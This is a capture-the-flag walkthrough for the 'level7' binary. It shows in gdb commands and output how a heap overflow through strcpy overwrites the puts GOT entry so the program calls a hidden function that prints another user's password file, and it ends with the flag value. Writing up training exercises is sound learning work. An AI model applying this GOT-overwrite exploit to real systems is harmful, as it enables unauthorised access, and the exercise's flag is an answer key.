# level7

# Analyse
In this level we have an executable `level7`
```bash
> ./level7
Segmentation fault (core dumped)
> ./level7 arg
Segmentation fault (core dumped)
> ./level7 arg1 arg2
~~
```

Ok so we need 2 arguments to call the executable.

Now let's disassemble the program to understand all (see source).

We see that we have a function `m` that is never called. This function print a global variable & the current time.

In the main function, we do some `malloc` & `strcpy` and then we open `"/home/user/level8/.pass"` and we write his content in the same global variable as `m`.

If we call `m` after `fgets` function, `m` will write the password !

# Exploit
To call `m` we replace the call of `puts` by a call to `m`.

Let's get the `m` and `puts` addresses:
```bash
> gdb level7
(gdb) $ p m
$1 = {<text variable, no debug info>} 0x80484f4 <m>  ; <- addr of m: 0x80484f4
(gdb) $ disass puts
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    DWORD PTR ds:0x8049928  ; <- addr of puts: 0x8049928
   0x08048406 <+6>:     push   0x28
   0x0804840b <+11>:    jmp    0x80483a0
End of assembler dump.
```

Now we can see that if we strcpy a long str, the content of this str will be used in the next strcpy:
```bash
> gdb level7
(gdb) $ run "`perl -e 'print "A"x30'`" "BBBB"
...
[-------------------------------------code-------------------------------------]
   0x80485b3 <main+146>:        mov    eax,DWORD PTR [eax+0x4]
   0x80485b6 <main+149>:        mov    DWORD PTR [esp+0x4],edx
   0x80485ba <main+153>:        mov    DWORD PTR [esp],eax
=> 0x80485bd <main+156>:        call   0x80483e0 <strcpy@plt>
   0x80485c2 <main+161>:        mov    edx,0x80486e9
   0x80485c7 <main+166>:        mov    eax,0x80486eb
   0x80485cc <main+171>:        mov    DWORD PTR [esp+0x4],edx
   0x80485d0 <main+175>:        mov    DWORD PTR [esp],eax
Guessed arguments:
arg[0]: 0x41414141 ('AAAA')
arg[1]: 0xbffff88c ("BBBB")
```

In this example, we see that if we send 30 A in the first argument, the second strcpy will try to write `"BBBB"` in address `0x41414141` -> "AAAA". Now we try to see the right offset.

The offset is 24. So we will write 20 A, then the address we want to change (`puts`) and for the second argument, the `m` address.
```bash
> ./level7 "`perl -e 'print "A"x20 . "\x28\x99\x04\x08"'`" "`perl -e 'print "\xf4\x84\x04\x08"'`"
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1591179845
```

# flag
```
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```
